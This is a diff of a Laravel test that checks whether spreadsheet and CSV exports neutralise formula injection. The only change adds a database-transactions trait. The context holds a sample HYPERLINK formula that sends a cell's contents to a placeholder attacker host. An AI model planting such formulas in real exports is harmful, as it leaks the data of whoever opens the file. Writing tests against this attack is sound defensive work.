@@ -4,6 +4,7 @@ namespace Tests\Feature\Seguridad;
 
 use App\Helpers\ExportSeguroHelper;
 use App\Services\ReportesExportService;
+use Illuminate\Foundation\Testing\DatabaseTransactions;
 use PhpOffice\PhpSpreadsheet\Cell\DataType;
 use PhpOffice\PhpSpreadsheet\IOFactory;
 use Tests\TestCase;
@@ -13,6 +14,8 @@ use Tests\TestCase;
  */
 class ExportSinFormulasTest extends TestCase
 {
+    use DatabaseTransactions;
+
     private const PAYLOAD = '=HYPERLINK("http://atacante.example/?x="&A1,"Ver")';
 
     public function test_csv_antepone_comilla_a_valores_peligrosos(): void
